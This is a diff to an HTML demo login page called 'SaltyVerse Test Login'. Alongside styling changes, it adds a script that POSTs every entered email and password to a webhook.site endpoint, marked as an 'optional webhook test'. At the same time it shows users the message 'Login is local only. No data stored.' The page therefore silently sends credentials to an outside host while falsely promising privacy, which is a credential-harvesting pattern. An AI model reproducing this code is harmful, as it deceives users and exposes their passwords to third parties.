@@ -3,98 +3,126 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>Welcome to the SaltyVerse Portal</title>
-  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700&family=Montserrat:wght@500;700&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700&family=Montserrat:wght@400;600;700&display=swap" rel="stylesheet">
   <style>
     html, body {
-      margin: 0; padding: 0; height: 100%;
+      margin: 0;
+      padding: 0;
       font-family: 'Montserrat', sans-serif;
-      background: radial-gradient(ellipse at center, #0A0B1F 0%, #01020C 100%);
+      background: radial-gradient(circle at center, #0A0B1F, #01020C);
       color: #fff;
+      height: 100vh;
       overflow: hidden;
     }
-    .center-box {
-      position: relative;
-      z-index: 2;
-      max-width: 420px;
-      margin: 8vh auto;
+
+    .container {
+      max-width: 400px;
       background: rgba(20, 20, 40, 0.95);
+      margin: 6vh auto;
       padding: 2rem;
       border-radius: 15px;
-      text-align: center;
       box-shadow: 0 0 25px #FF3CAC, 0 0 50px #42FFB9;
+      text-align: center;
     }
+
     h1 {
       font-family: 'Orbitron', sans-serif;
-      font-size: 2.2rem;
-      color: #FFD700;
+      font-size: 1.8rem;
       margin-bottom: 1rem;
-      text-shadow: 0 0 12px #FF3CAC;
+      color: #FFD700;
     }
-    input, button {
-      width: 100%;
-      margin: 0.5rem 0;
-      padding: 1rem;
-      border: none;
-      border-radius: 8px;
-      font-size: 1rem;
-    }
+
     input {
+      width: 100%;
+      padding: 0.9rem;
+      margin: 0.5rem 0;
+      border-radius: 8px;
+      border: none;
+      font-size: 1rem;
       background: #111;
       color: #fff;
     }
+
     button {
+      width: 100%;
+      padding: 1rem;
       background: #FF3CAC;
-      color: black;
+      color: #000;
       font-weight: bold;
+      font-size: 1rem;
+      border: none;
+      border-radius: 8px;
       cursor: pointer;
+      transition: 0.3s ease;
     }
+
     button:hover {
       background: #42FFB9;
     }
-    .instruction {
-      color: #FFD700;
-      font-style: italic;
-      margin-top: 10px;
-    }
+
     .shaniqua-img {
-      margin-top: 20px;
-      max-width: 100%;
+      width: 140px;
+      margin: 20px auto 10px auto;
+      display: block;
       border-radius: 12px;
-      animation: pulse 3s infinite;
+      box-shadow: 0 0 12px #ff6bd9;
     }
-    @keyframes pulse {
-      0% { filter: brightness(1); }
-      50% { filter: brightness(1.2); }
-      100% { filter: brightness(1); }
+
+    #status {
+      margin-top: 1rem;
+      font-size: 0.9rem;
+      color: #79ffe1;
+      min-height: 1.3em;
+    }
+
+    footer {
+      text-align: center;
+      font-size: 0.9rem;
+      margin-top: 18px;
+    }
+
+    footer a {
+      color: #42FFB9;
+      text-decoration: none;
+      font-weight: bold;
     }
   </style>
 </head>
 <body>
-  <div class="center-box">
-    <h1>SaltyVerse Mega Login</h1>
-    <form onsubmit="initLogin(event)">
-      <input id="nickname" type="text" placeholder="Email" required />
-      <input id="password" type="password" placeholder="Password" required />
-      <button type="submit">Log Me In</button>
+  <div class="container">
+    <h1>SaltyVerse Test Login</h1>
+    <img class="shaniqua-img" src="https://img1.wsimg.com/isteam/ip/aec3b6e1-5b89-48ed-9233-4199ef9cca45/Shaniquaseesyou.png" alt="Shaniqua" />
+    <form onsubmit="handleLogin(event)">
+      <input type="email" id="email" placeholder="Email (e.g., salty@getabot.com)" required />
+      <input type="password" id="password" placeholder="Password" required />
+      <button type="submit">Enter Portal</button>
+      <div id="status">🔒 Login is local only. No data stored.</div>
     </form>
-    <p class="instruction">💡 Use <strong>salty@getabot.com</strong> and <strong>SALTYBOT</strong> to demo login.</p>
-    <img src="https://img1.wsimg.com/isteam/ip/aec3b6e1-5b89-48ed-9233-4199ef9cca45/Shaniquaseesyou.png/:/rs=h:225,m"
-         alt="Shaniqua Sees You"
-         class="shaniqua-img" style="max-width: 160px; border-radius: 12px; margin-top: 20px;" />
+    <footer>
+      <a href="https://tntcybersolutions.com" target="_blank">← Back to TNT Cyber Solutions</a>
+    </footer>
   </div>
 
   <script>
-    async function initLogin(e) {
+    async function handleLogin(e) {
       e.preventDefault();
-      const email = document.getElementById("nickname").value.toLowerCase();
-      const pw = document.getElementById("password").value;
+      const email = document.getElementById("email").value.trim();
+      const password = document.getElementById("password").value.trim();
+      const status = document.getElementById("status");
 
-      if (email === "salty@getabot.com" && pw === "SALTYBOT") {
-        alert("✅ Welcome to the SaltyVerse Demo, Queen.");
+      // Optional webhook test — replace with your actual endpoint
+      fetch("https://webhook.site/your-custom-url", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ email, password, time: new Date().toISOString() })
+      });
+
+      if (email.toLowerCase() === "salty@getabot.com" && password === "SALTYBOT") {
+        status.textContent = "✅ Access granted! Shaniqua approves.";
       } else {
-        alert("❌ Invalid login. Try salty@getabot.com and SALTYBOT to demo.");
+        status.textContent = "❌ Invalid test login.";
       }
     }
   </script>
